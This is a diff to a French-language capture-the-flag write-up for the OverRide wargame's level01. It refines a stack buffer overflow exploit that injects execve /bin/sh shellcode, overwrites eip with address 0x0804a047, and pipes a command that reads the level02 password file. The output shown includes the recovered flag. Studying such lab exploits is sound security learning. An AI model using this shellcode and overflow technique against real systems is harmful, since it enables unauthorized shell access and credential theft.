@@ -7,7 +7,7 @@ char username[256];
 char password[100];
 ```
 
-L'objectif va être de remplir la première avec un code que nous allons injecter, puis dans la seconde mettre une redirection afin de le guider vers le code injecté.
+L'objectif va être de remplir la première avec un code que nous allons injecter, puis de rediriger le flot d'exécution en écrasant eip afin de le guider vers le code injecté.
 La fonction que nous allons injecter est un execve avec le code suivant :
 
 ```bash
@@ -62,18 +62,16 @@ L'adresse de dat_will sera donc de 7 cases plus loin, soit en ``0x804a047``.
 Il ne nous reste plus qu'à exécuter avec cette commande finale :
 
 ```bash
-(python -c 'print "dat_wil" + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\n" + "A" * 80 + "\x47\xa0\x04\x08"'; cat) | ./level01
+(python -c 'print "dat_wil" + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\n" + "A" * 80 + "\x47\xa0\x04\x08"'; python -c 'print "cat /home/users/level02/.pass"'; cat) | ./level01
 ```
 
 ```bash
-level01@OverRide:~$ (python -c 'print "dat_wil" + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\n" + "A" * 80 + "\x47\xa0\x04\x08"'; cat) | ./level01
+level01@OverRide:~$ (python -c 'print "dat_wil" + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\n" + "A" * 80 + "\x47\xa0\x04\x08"'; python -c 'print "cat /home/users/level02/.pass"'; cat) | ./level01
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: verifying username....
 
 Enter Password: 
 nope, incorrect password...
 
-cat /home/users/level02/.pass
 PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
-level01@OverRide:~$
 ```
